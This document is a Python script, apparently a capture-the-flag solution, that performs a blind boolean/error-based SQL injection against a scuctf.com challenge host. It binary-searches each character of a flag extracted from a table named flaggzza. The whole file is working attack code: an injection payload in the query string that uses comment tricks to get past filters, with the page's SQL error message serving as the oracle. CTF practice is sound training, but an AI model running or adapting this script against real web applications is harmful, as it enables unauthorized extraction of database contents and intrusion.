import requests

result = ""
url = 'http://ca9c8a8d-11c3-4e91-92c0-111694a4f210.game.scuctf.com:23333/'
i = 0

while True:
    i = i + 1
    head = 32
    tail = 127

    while head < tail:
        mid = (head + tail) >> 1

        payload = f'ascii(substr((select/*[*/group_concat(flag) from flaggzza) from {i} for 1))>{mid}'
        resurl = f"{url}?test/3'/**/or/**/if({payload},0,1))%23"
        r = requests.get(resurl)
        if "执行SQL发生错误" in r.text:
            head = mid + 1
        else:
            tail = mid

    if head != 32:
        result += chr(head)
    else:
        break
    print(result)

